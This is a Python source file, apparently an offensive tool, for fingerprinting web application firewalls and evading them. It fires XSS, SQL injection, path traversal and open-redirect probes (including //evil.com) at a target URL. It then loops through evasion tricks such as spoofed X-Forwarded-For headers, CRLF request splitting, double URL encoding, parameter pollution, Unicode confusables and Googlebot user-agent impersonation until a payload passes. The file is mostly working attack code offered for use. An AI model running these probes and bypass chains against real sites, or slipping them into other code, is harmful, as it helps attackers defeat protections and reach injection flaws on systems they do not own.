#!/usr/bin/env python3
"""
🔥 ADVANCED WAF BYPASS SYSTEM - Complete Evasion Arsenal
"""

import asyncio
import random
import base64
import urllib.parse
from typing import Dict, List, Optional, Tuple
from urllib.parse import quote, unquote


class AdvancedWAFBypass:
    """Advanced WAF bypass with multiple evasion techniques"""
    
    def __init__(self):
        # WAF signatures
        self.waf_signatures = {
            'cloudflare': ['cf-ray', 'cloudflare', '__cfduid'],
            'aws_waf': ['x-amzn-requestid', 'x-amz-cf-id'],
            'incapsula': ['incap_ses', 'visid_incap'],
            'sucuri': ['sucuri', 'x-sucuri-id'],
            'barracuda': ['barra', 'barracuda'],
            'f5_big_ip': ['f5-bigip', 'bigipserver'],
            'fortinet': ['fortigate', 'fortiweb'],
            'akamai': ['akamai', 'ak_bmsc']
        }
        
        # Bypass techniques
        self.bypass_techniques = {
            'header_injection': self.get_bypass_headers,
            'case_variation': self.apply_case_variation,
            'encoding_variation': self.apply_encoding_variation,
            'parameter_pollution': self.apply_parameter_pollution,
            'user_agent_rotation': self.rotate_user_agent,
            'ip_spoofing': self.spoof_ip_headers,
            'request_splitting': self.apply_request_splitting,
            'unicode_normalization': self.apply_unicode_bypass
        }
        
        # Advanced user agents
        self.advanced_user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
        ]
    
    async def detect_advanced_waf(self, session, url: str) -> Dict:
        """Advanced WAF detection"""
        waf_info = {
            'detected': False,
            'type': 'unknown',
            'confidence': 0.0,
            'bypass_methods': [],
            'signatures_found': [],
            'response_patterns': []
        }
        
        # Test payloads for WAF detection
        test_payloads = [
            "?test=<script>alert(1)</script>",
            "?test=' OR 1=1--",
            "?test=../../etc/passwd",
            "?test=javascript:confirm(1)",
            "?test=//evil.com"
        ]
        
        for payload in test_payloads:
            try:
                test_url = f"{url}{payload}"
                async with session.get(test_url, allow_redirects=False) as response:
                    headers = dict(response.headers)
                    content = await response.text()
                    
                    # Check headers for WAF signatures
                    for waf_type, signatures in self.waf_signatures.items():
                        for signature in signatures:
                            for header_name, header_value in headers.items():
                                if signature.lower() in header_name.lower() or signature.lower() in header_value.lower():
                                    waf_info['detected'] = True
                                    waf_info['type'] = waf_type
                                    waf_info['signatures_found'].append(signature)
                                    waf_info['confidence'] = min(waf_info['confidence'] + 0.3, 1.0)
                    
                    # Check response patterns
                    blocked_patterns = [
                        'access denied', 'blocked', 'forbidden', 'security',
                        'firewall', 'protection', 'suspicious', 'malicious'
                    ]
                    
                    content_lower = content.lower()
                    for pattern in blocked_patterns:
                        if pattern in content_lower:
                            waf_info['response_patterns'].append(pattern)
                            waf_info['confidence'] = min(waf_info['confidence'] + 0.1, 1.0)
                    
                    # Check status codes
                    if response.status in [403, 406, 429, 444, 499]:
                        waf_info['detected'] = True
                        waf_info['confidence'] = min(waf_info['confidence'] + 0.2, 1.0)
                
                await asyncio.sleep(0.1)  # Rate limiting
                
            except:
                continue
        
        # Determine bypass methods
        if waf_info['detected']:
            waf_info['bypass_methods'] = self.suggest_bypass_methods(waf_info['type'])
        
        return waf_info
    
    def suggest_bypass_methods(self, waf_type: str) -> List[str]:
        """Suggest bypass methods for specific WAF"""
        bypass_map = {
            'cloudflare': ['header_injection', 'case_variation', 'encoding_variation'],
            'aws_waf': ['parameter_pollution', 'unicode_normalization', 'user_agent_rotation'],
            'incapsula': ['ip_spoofing', 'request_splitting', 'case_variation'],
            'sucuri': ['header_injection', 'encoding_variation', 'parameter_pollution'],
            'generic': ['header_injection', 'case_variation', 'user_agent_rotation']
        }
        
        return bypass_map.get(waf_type, bypass_map['generic'])
    
    def get_bypass_headers(self) -> Dict[str, str]:
        """Get bypass headers"""
        bypass_sets = [
            {
                'X-Originating-IP': '127.0.0.1',
                'X-Forwarded-For': '127.0.0.1',
                'X-Real-IP': '127.0.0.1'
            },
            {
                'X-Remote-Addr': '127.0.0.1',
                'X-Client-IP': '127.0.0.1',
                'X-Host': 'localhost'
            },
            {
                'X-Forwarded-Host': 'localhost',
                'X-Originating-URL': '/',
                'X-Cluster-Client-IP': '127.0.0.1'
            },
            {
                'CF-Connecting-IP': '127.0.0.1',
                'True-Client-IP': '127.0.0.1',
                'X-ProxyUser-Ip': '127.0.0.1'
            }
        ]
        
        return random.choice(bypass_sets)
    
    def apply_case_variation(self, payload: str) -> List[str]:
        """Apply case variation bypass"""
        variations = [
            payload.upper(),
            payload.lower(),
            payload.capitalize(),
            ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)),
            ''.join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(payload))
        ]
        
        return list(set(variations))
    
    def apply_encoding_variation(self, payload: str) -> List[str]:
        """Apply encoding variation bypass"""
        variations = []
        
        # URL encoding
        variations.append(quote(payload))
        variations.append(quote(payload, safe=''))
        
        # Double URL encoding
        variations.append(quote(quote(payload)))
        
        # Unicode encoding
        unicode_payload = ''.join(f'\\u{ord(c):04x}' if ord(c) > 127 else c for c in payload)
        variations.append(unicode_payload)
        
        # HTML entity encoding
        html_payload = ''.join(f'&#{ord(c)};' if c in '<>"\'&' else c for c in payload)
        variations.append(html_payload)
        
        # Base64 encoding
        try:
            b64_payload = base64.b64encode(payload.encode()).decode()
            variations.append(b64_payload)
        except:
            pass
        
        return variations
    
    def apply_parameter_pollution(self, param_name: str, payload: str) -> List[Tuple[str, str]]:
        """Apply HTTP parameter pollution"""
        pollution_techniques = [
            # Standard pollution
            [(param_name, 'safe_value'), (param_name, payload)],
            [(param_name, payload), (param_name, 'safe_value')],
            
            # Case variation pollution
            [(param_name.upper(), 'safe_value'), (param_name.lower(), payload)],
            [(param_name.lower(), payload), (param_name.upper(), 'safe_value')],
            
            # Bracket notation
            [(f"{param_name}[]", payload), (param_name, 'safe_value')],
            [(param_name, 'safe_value'), (f"{param_name}[]", payload)],
        ]
        
        return random.choice(pollution_techniques)
    
    def rotate_user_agent(self) -> str:
        """Rotate user agent"""
        return random.choice(self.advanced_user_agents)
    
    def spoof_ip_headers(self) -> Dict[str, str]:
        """Generate IP spoofing headers"""
        fake_ips = ['127.0.0.1', '10.0.0.1', '192.168.1.1', '172.16.0.1']
        fake_ip = random.choice(fake_ips)
        
        return {
            'X-Forwarded-For': fake_ip,
            'X-Real-IP': fake_ip,
            'X-Originating-IP': fake_ip,
            'X-Remote-Addr': fake_ip,
            'Client-IP': fake_ip
        }
    
    def apply_request_splitting(self, payload: str) -> str:
        """Apply request splitting bypass"""
        splitting_chars = ['%0d%0a', '%0a', '%0d', '%20', '%09']
        split_char = random.choice(splitting_chars)
        
        return f"{payload}{split_char}X-Ignore: ignored"
    
    def apply_unicode_bypass(self, payload: str) -> List[str]:
        """Apply Unicode normalization bypass"""
        variations = []
        
        # Unicode confusables
        confusables = {
            'a': ['а', 'ạ', 'ả', 'ã'],  # Cyrillic and accented
            'e': ['е', 'ẹ', 'ẻ', 'ẽ'],
            'o': ['о', 'ọ', 'ỏ', 'õ'],
            'p': ['р', 'ṗ', 'ṕ'],
            's': ['ѕ', 'ṡ', 'ṣ'],
            'c': ['с', 'ċ', 'ć'],
            'x': ['х', 'ẋ', 'ẍ']
        }
        
        # Generate confusable variations
        for char, replacements in confusables.items():
            if char in payload.lower():
                for replacement in replacements:
                    variations.append(payload.replace(char, replacement))
                    variations.append(payload.replace(char.upper(), replacement.upper()))
        
        # Zero-width characters
        zero_width_chars = ['\\u200b', '\\u200c', '\\u200d', '\\ufeff']
        for zw_char in zero_width_chars:
            variations.append(payload + zw_char)
            variations.append(zw_char + payload)
        
        return variations[:5]  # Limit variations
    
    async def execute_bypass_chain(self, session, url: str, waf_type: str, payload: str) -> Optional[str]:
        """Execute complete bypass chain"""
        bypass_methods = self.suggest_bypass_methods(waf_type)
        
        for method in bypass_methods:
            try:
                if method == 'header_injection':
                    headers = self.get_bypass_headers()
                    async with session.get(f"{url}?test={payload}", headers=headers, allow_redirects=False) as response:
                        if response.status not in [403, 406, 429]:
                            return await response.text()
                
                elif method == 'case_variation':
                    variations = self.apply_case_variation(payload)
                    for variation in variations:
                        async with session.get(f"{url}?test={variation}", allow_redirects=False) as response:
                            if response.status not in [403, 406, 429]:
                                return await response.text()
                
                elif method == 'encoding_variation':
                    variations = self.apply_encoding_variation(payload)
                    for variation in variations:
                        async with session.get(f"{url}?test={variation}", allow_redirects=False) as response:
                            if response.status not in [403, 406, 429]:
                                return await response.text()
                
                elif method == 'user_agent_rotation':
                    ua = self.rotate_user_agent()
                    headers = {'User-Agent': ua}
                    async with session.get(f"{url}?test={payload}", headers=headers, allow_redirects=False) as response:
                        if response.status not in [403, 406, 429]:
                            return await response.text()
                
                await asyncio.sleep(0.1)  # Rate limiting
                
            except:
                continue
        
        return None
    
    def generate_waf_report(self, waf_info: Dict, bypass_success: Dict) -> Dict:
        """Generate WAF analysis report"""
        return {
            'waf_detected': waf_info['detected'],
            'waf_type': waf_info['type'],
            'waf_confidence': waf_info['confidence'],
            'signatures_found': waf_info['signatures_found'],
            'bypass_attempts': len(bypass_success),
            'successful_bypasses': sum(1 for success in bypass_success.values() if success),
            'recommended_techniques': waf_info.get('bypass_methods', []),
            'evasion_success_rate': sum(1 for success in bypass_success.values() if success) / max(len(bypass_success), 1)
        }